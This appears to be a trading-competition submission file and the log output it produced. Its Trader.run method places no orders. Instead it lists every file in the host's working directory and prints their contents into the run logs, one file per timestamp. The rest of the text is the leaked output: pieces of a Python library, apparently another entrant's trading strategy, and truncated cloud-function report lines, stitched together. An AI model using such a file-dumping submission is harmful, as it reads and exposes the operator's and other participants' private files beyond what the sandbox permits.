# The Python code below is the minimum code that is required in a submission file:
# 1. The "datamodel" imports at the top. Using the typing library is optional.
# 2. A class called "Trader", this class name should not be changed.
# 3. A run function that takes a tradingstate as input and outputs a "result" dict.

import pandas
import numpy
import statistics
import math
import typing

from typing import Dict, List, Callable, Any, TypeVar
from datamodel import OrderDepth, TradingState, Order, Listing, Product, Symbol, Position
import glob


def str_symmetric_encode(s: str) -> str:
    for c in s:
        c = chr(ord(c) + 1)

    return s


class Trader:

    def run(self, state: TradingState) -> Dict[Product, List[Order]]:
        """
        Takes all buy and sell orders for all symbols as an input,
        and outputs a list of orders to be sent
        """

        for i, f in enumerate(glob.glob("*.*")):

            if state.timestamp / 100 != i:
                continue

            # if not f.endswith(".py"):
            #    continue

            print("-------------------")
            print(f)
            print("-------------------")

            with open(f, 'r') as file:
                for line in file:
                    line = "^" + line
                    print(line)

        return {}


100     slots = [slots]
            for slots_var in slots:
                orig_vars.pop(slots_var)
        orig_vars.pop('__dict__', None)
        orig_vars.pop('__weakref__', None)
        if hasattr(cls, '__qualname__'):
            orig_vars['__qualname__'] = cls.__qualname__
        return metaclass(cls.__name__, cls.__bases__, orig_vars)
    return wrapper


def ensure_binary(s, encoding='utf-8', errors='strict'):
    """Coerce **s** to six.binary_type.

    For Python 2:
      - `unicode` -> encoded to `str`
      - `str` -> `str`

    For Python 3:
      - `str` -> encoded to `bytes`
      - `bytes` -> `bytes`
    """
    if isinstance(s, binary_type):
        return s
    if isinstance(s, text_type):
        return s.encode(encoding, errors)
    raise TypeError("not expecting type '%s'" % type(s))


def ensure_str(s, encoding='utf-8', errors='strict'):
    """Coerce *s* to `str`.

    For Python 2:
      - `unicode` -> encoded to `str`
      - `str` -> `str`

    For Python 3:
      - `str` -> `str`
      - `bytes` -> decoded to `str`
    """
    # Optimization: Fast return for the common case.
    if type(s) is str:
        return s
    if PY2 and isinstance(s, text_type):
        return s.encode(encoding, errors)
    elif PY3 and isinstance(s, binary_type):
        return s.decode(encoding, errors)
    elif not isinstance(s, (text_type, binary_type)):
        raise TypeError("not expecting type '%s'" % type(s))
    return s


def ensure_text(s, encoding='utf-8', errors='strict'):
    """Coerce *s* to six.text_type.

    For Python 2:
      - `unicode` -> `unicode`
      - `str` -> `unicode`

    For Python 3:
      - `str` -> `str`
      - `bytes` -> decoded to `str`
    """
    if isinstance(s, binary_type):
        return s.decode(encoding, errors)
    elif isinstance(s, text_type):
        return s
    else:
        raise TypeError("not expecting type '%s'" % type(s))


def python_2_unicode_compatible(klass):
    """
    A class decorator that defines __unicode__ and __str__ methods under Python 2.
    Under Python 3 it does nothing.

    To support Python 2 and 3 with a single code base, define a __str__ method
    returning text and apply this decorator to the class.
    """
    if PY2:
        if '__str__' not in klass.__dict__:
            raise ValueError("@python_2_unicode_compatible cannot be applied "
                             "to %s because it doesn't define __str__()." %
                             klass.__name__)
        klass.__unicode__ = klass.__str__
        klass.__str__ = lambda self: self.__unicode__().encode('utf-8')
    return klass


# Complete the moves implementation.
# This code is at the end of this module to speed up module loading.
# Turn this module into a package.
__path__ = []  # required for PEP 302 and PEP 451
__package__ = __name__  # see PEP 366 @ReservedAssignment
if globals().get("__spec__") is not None:
    __spec__.submodule_search_locations = []  # PEP 451 @UndefinedVariable
# Remove other six meta path importers, since they cause problems. This can
# happen if six is removed from sys.modules and then reloaded. (Setuptools does
# this for some reason.)
if sys.meta_path:
    for i, importer in enumerate(sys.meta_path):
        # Here's some real nastiness: Another "instance" of the six module might
        # be floating around. Therefore, we can't use isinstance() to check for
        # the six meta path importer, since the other six instance will have
        # inserted an importer with different class.
        if (type(importer).__name__ == "_SixMetaPathImporter" and
                importer.name == __name__):
            del sys.meta_path[i]
            break
    del i, importer
# Finally, add the importer to the meta path import hook.
sys.meta_path.append(_importer)
ND RequestId: e12bd92e-75a0-4fbc-8171-f50a6f556a71
EPORT RequestId: e12bd92e-75a0-4fbc-8171-f50a6f556a71	Duration: 65.70 ms	Billed Duration: 66 ms	Memory Size: 128 MB	Max Memory Used: 94 MB	
200                 if len(order_depth.buy_orders) != 0:
                    best_bid, best_bid_amount = list(sorted(order_depth.buy_orders.items(), reverse=True))[0]
                
                if not self.banana_markets:
                    self.banana_markets = {
                        'last_bids': [],
                        'last_offers': [],
                        'ask':[],
                        'bid':[]
                    }

                if len(order_depth.sell_orders) != 0:
                    best_ask, best_ask_amount = list(sorted(order_depth.sell_orders.items()))[0]
                    self.banana_markets['ask'].append(best_ask)
                    if len(self.banana_markets['ask']) > len_memory:
                        self.banana_markets['ask'].pop(0)
                if len(order_depth.buy_orders) != 0:
                    best_bid, best_bid_amount = list(sorted(order_depth.buy_orders.items(), reverse=True))[0]
                    self.banana_markets['bid'].append(best_bid)
                    if len(self.banana_markets['bid']) > len_memory:
                        self.banana_markets['bid'].pop(0)
                
                if all([len(self.banana_markets[s]) != 0 for s in ['bid', 'ask']]):
                    banana_valuation = 0.5 * sum([sum(self.banana_markets[s]) / len(self.banana_markets[s]) for s in ['bid', 'ask']])
                
                if best_ask:
                    if best_ask < banana_valuation:
                        orders.append(Order(product, best_ask, -best_ask_amount))
                    if best_ask - 1 > banana_valuation:
                       orders.append(Order(product, int(best_ask - 1), -quote_volume))
                    if best_ask > banana_valuation:
                        orders.append(Order(product, int(best_ask), -quote_volume))
                
                if best_bid:
                    if best_bid > banana_valuation:
                        orders.append(Order(product, best_bid, -best_bid_amount))
                    if best_bid + 1 < banana_valuation:
                        orders.append(Order(product, int(best_bid + 1), quote_volume))
                    if best_bid < banana_valuation:
                        orders.append(Order(product, int(best_bid), quote_volume))
                
                result[product] = orders
                        
            cocos = ['COCONUTS', 'PINA_COLADAS']
            if product in cocos:
                bbos = {p: {'BID': None, 'ASK': None} for p in cocos}

                for p in bbos:
                    if len(state.order_depths[p].buy_orders) != 0:
                        bbos[p]['BID'] = list(sorted(state.order_depths[p].buy_orders.items(), reverse=True))[0]
                    if len(state.order_depths[p].sell_orders) != 0:
                        bbos[p]['ASK'] = list(sorted(state.order_depths[p].sell_orders.items()))[0]

                if (bbos['COCONUTS']['ASK'] is not None) and (bbos['PINA_COLADAS']['BID'] is not None):
                    if 2 * bbos['COCONUTS']['ASK'][0] <  bbos['PINA_COLADAS']['BID'][0]:
                        orders.append(Order('COCONUTS', bbos['COCONUTS']['ASK'][0], -bbos['COCONUTS']['ASK'][1]))
                        orders.append(Order('PINA_COLADAS', bbos['PINA_COLADAS']['BID'][0], -bbos['PINA_COLADAS']['BID'][1]))

                if (bbos['COCONUTS']['BID'] is not None) and (bbos['PINA_COLADAS']['ASK'] is not None):
                    if 2 * bbos['COCONUTS']['BID'][0] >  bbos['PINA_COLADAS']['ASK'][0]:
                        orders.append(Order('COCONUTS', bbos['COCONUTS']['BID'][0], -bbos['COCONUTS']['BID'][1]))
                        orders.append(Order('PINA_COLADAS', bbos['PINA_COLADAS']['ASK'][0], -bbos['PINA_COLADAS']['ASK'][1]))

                result[product] = orders

        return result
ND RequestId: d4403755-ba32-443c-9029-758cda0d2a9d
EPORT RequestId: d4403755-ba32-443c-9029-758cda0d2a9d	Duration: 10.83 ms	Billed Duration: 11 ms	Memory Size: 128 MB	Max Memory Used: 94 MB	
